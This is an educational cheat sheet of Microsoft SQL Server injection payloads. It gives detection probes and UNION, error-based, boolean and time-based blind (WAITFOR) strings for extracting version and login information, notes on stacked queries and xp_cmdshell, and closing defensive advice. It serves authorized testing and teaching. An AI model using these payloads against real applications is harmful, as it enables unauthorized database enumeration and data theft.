# Microsoft SQL Server (MSSQL) — Example SQL Injection Payloads & Notes (Non-destructive, Educational)

> [!WARNING]
> **Ethics reminder:** The examples in this file are for education and authorized testing only. Do **not** run these payloads against systems you do not own or do not have explicit written permission to test. Use intentionally vulnerable labs or local MSSQL instances for practice.

---

## Contents

* Basic detection probes
* UNION-based examples (non-destructive)
* Error-based examples (safe probes)
* Boolean-based blind examples
* Time-based blind examples (WAITFOR)
* Stacked-queries and batch behavior in MSSQL
* MSSQL-specific functions & extended procedures
* Defensive notes specific to MSSQL

---

## 1. Basic detection probes

Start with simple, low-risk inputs to check whether an application is likely vulnerable:

* `'` — single quote to provoke syntax errors.
* `"` — double quote depending on context.
* `1 OR 1=1` — logic change probe.

Example HTTP parameter probe:

```
GET /item?id=1'
```

Look for MSSQL-like errors such as `Unclosed quotation mark after the character string` or `Incorrect syntax near`.

---

## 2. UNION-based (non-destructive) examples

Assume an original query: `SELECT id, name, price FROM products WHERE id = 'USER_INPUT'`

### Find column count

Use incremental `NULL` placeholders:

```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

Stop when the DB stops returning a column-count error.

### Identify display columns

```sql
' UNION SELECT 'C1', 'C2', 'C3' --
```

Observe which markers appear in the page to identify reflected columns.

### Non-destructive enumeration examples

Once you identify display columns:

```sql
' UNION SELECT NULL, @@version, NULL --
' UNION SELECT NULL, SYSTEM_USER, NULL --
```

These may reveal SQL Server version and current DB user for fingerprinting.

---

## 3. Error-based (safe probes)

Trigger simple errors to fingerprint the DBMS and observe behavior.

* Single quote: `'`
* Conversion errors (illustrative):

```sql
' AND 1=(SELECT CONVERT(INT, @@version)) --
```

This may produce a conversion error revealing parts of the attempted value depending on configuration.

Avoid forcing extensive or destructive errors on production systems.

---

## 4. Boolean-based blind examples

Character extraction pattern (MSSQL):

```sql
' AND SUBSTRING((SELECT SYSTEM_USER),1,1) = 'a' --
```

Start with `AND 1=1` / `AND 1=2` to confirm influence before attempting extraction.

Optimizations:

* Limit character set.
* Use binary-search on ASCII ranges to reduce requests.

---

## 5. Time-based blind examples (MSSQL)

SQL Server uses `WAITFOR DELAY 'hh:mm:ss'` to introduce delays. Inject conditional waits carefully.

### Simple timing check

```sql
' ; IF 1=1 WAITFOR DELAY '00:00:05' --
```

If the response delays by \~5s, timing injection may be possible.

### Character extraction using WAITFOR

```sql
' ; IF (SUBSTRING((SELECT SYSTEM_USER),1,1) = 'a') WAITFOR DELAY '00:00:05' --
```

MSSQL's batch execution semantics may require adjusting payload placement depending on the API.

**Caveats:** Many APIs disallow multiple statements or batch commands by default.

---

## 6. Stacked-queries & batch behavior in MSSQL

MSSQL supports batch separators and multiple statements. Some client libraries permit batching while others restrict it.

### Safe test for batch execution

```sql
' ; SELECT 'X' --
```

If additional results or behaviors are observed, batching may be allowed — treat this as high risk.

**Warning:** Do not use destructive `DROP`/`DELETE` payloads during discovery.

---

## 7. MSSQL-specific functions & extended procedures

* `@@version` — SQL Server version string
* `SYSTEM_USER` — current login
* `SUSER_SNAME()` — login name
* `DB_NAME()` — current DB name
* `CHAR()` — build strings from ASCII codes
* `CONVERT()` / `CAST()` — type conversions
* `WAITFOR DELAY` — timing-based delays
* `OPENROWSET`, `OPENDATASOURCE`, `xp_cmdshell`, `xp_dirtree` — potentially powerful and dangerous; often disabled or limited

**Note:** Extended procedures like `xp_cmdshell` are typically disabled in secure environments — if enabled, they can allow OS‑level command execution.

---

## 8. Defensive notes specific to MSSQL

> [!NOTE]
> * **Disable `xp_cmdshell`** unless explicitly required and tightly controlled.
> * **Least privilege:** Application DB accounts should not have elevated server-level permissions.
> * **Use parameterized queries** (e.g., `sp_executesql` with parameter binding) to prevent injection.
> * **Monitor for access to `OPENROWSET`/`OPENDATASOURCE`** and other functions that may reach external resources.
> * **Hide detailed DB errors** from end users; log errors internally for analysis.
> * **Harden instance configuration**: disable unneeded features and audit server-level permissions.

---

## 9. Where to practice safely

> [!TIP]
> * PortSwigger Academy labs with MSSQL targets
> * Local Docker/VM setups running MSSQL with intentionally vulnerable web apps
> * OWASP Juice Shop configured against MSSQL backends (if available)